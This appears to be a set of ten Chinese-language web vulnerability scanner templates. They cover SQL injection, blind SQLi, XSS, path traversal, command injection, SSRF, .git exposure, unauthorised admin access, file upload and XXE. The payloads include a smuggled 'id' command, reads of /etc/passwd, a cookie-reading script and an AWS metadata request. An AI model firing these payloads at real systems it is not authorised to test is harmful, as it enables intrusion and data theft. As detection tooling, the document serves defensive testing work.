# SQL 注入漏洞检测模板

## 模板 1: 基础 SQL 注入

```template
id: sqli-basic
name: 基础 SQL 注入检测
severity: 高危
description: 检测常见的 SQL 注入漏洞
method: GET
path: /
payload: id=1' OR '1'='1
matchers:
  - type: status
    value: 200
  - type: body
    pattern: SQL syntax
  - type: body
    pattern: mysql_fetch
tags:
  - sqli
  - injection
```

## 模板 2: 时间盲注

```template
id: sqli-time-based
name: 时间盲注检测
severity: 高危
description: 检测基于时间的盲注漏洞
method: GET
path: /api/user
payload: id=1; WAITFOR DELAY '0:0:5'
matchers:
  - type: status
    value: 200
  - type: regex
    pattern: (5|6|7)\.\d{2}
tags:
  - sqli
  - time-based
```

## 模板 3: XSS 漏洞检测

```template
id: xss-reflected
name: 反射型 XSS 检测
severity: 中危
description: 检测反射型跨站脚本漏洞
method: GET
path: /search
payload: q=<script>alert(document.cookie)</script>
matchers:
  - type: body
    pattern: <script>alert(document.cookie)</script>
  - type: header
    key: Content-Type
    value: text/html
tags:
  - xss
  - reflected
```

## 模板 4: 路径穿越

```template
id: path-traversal
name: 路径穿越漏洞检测
severity: 高危
description: 检测目录遍历漏洞
method: GET
path: /download
payload: file=../../../etc/passwd
matchers:
  - type: body
    pattern: root:.*:0:0:
  - type: status
    value: 200
tags:
  - path-traversal
  - lfi
```

## 模板 5: 命令注入

```template
id: command-injection
name: 命令注入漏洞检测
severity: 危急
description: 检测操作系统命令注入
method: POST
path: /api/ping
body: host=127.0.0.1;id
matchers:
  - type: body
    pattern: uid=\d+
  - type: body
    pattern: gid=\d+
tags:
  - rce
  - command-injection
```

## 模板 6: SSRF 漏洞

```template
id: ssrf-internal
name: SSRF 内网探测
severity: 高危
description: 检测服务端请求伪造漏洞
method: GET
path: /api/fetch
payload: url=http://169.254.169.254/latest/meta-data/
matchers:
  - type: body
    pattern: ami-id
  - type: body
    pattern: instance-id
tags:
  - ssrf
  - cloud
```

## 模板 7: 敏感信息泄露

```template
id: info-leak-git
name: Git 配置泄露
severity: 中危
description: 检测.git/config 文件泄露
method: GET
path: /.git/config
matchers:
  - type: status
    value: 200
  - type: body
    pattern: [core]
  - type: body
    pattern: repositoryformatversion
tags:
  - info-leak
  - git
```

## 模板 8: 未授权访问

```template
id: unauthorized-admin
name: 后台未授权访问
severity: 高危
description: 检测后台管理界面未授权访问
method: GET
path: /admin
matchers:
  - type: status
    value: 200
  - type: body
    pattern: 管理后台
  - type: body
    pattern: 登录
tags:
  - unauthorized
  - admin
```

## 模板 9: 文件上传漏洞

```template
id: file-upload
name: 文件上传漏洞检测
severity: 高危
description: 检测不安全的文件上传
method: POST
path: /upload
body: file=test.php
headers:
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
matchers:
  - type: status
    value: 200
  - type: body
    pattern: .php
  - type: body
    pattern: uploaded
tags:
  - upload
  - rce
```

## 模板 10: XXE 注入

```template
id: xxe-injection
name: XXE 注入检测
severity: 危急
description: 检测 XML 外部实体注入
method: POST
path: /api/xml
body: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>
matchers:
  - type: body
    pattern: root:.*:0:0:
  - type: header
    key: Content-Type
    value: application/xml
tags:
  - xxe
  - injection
```
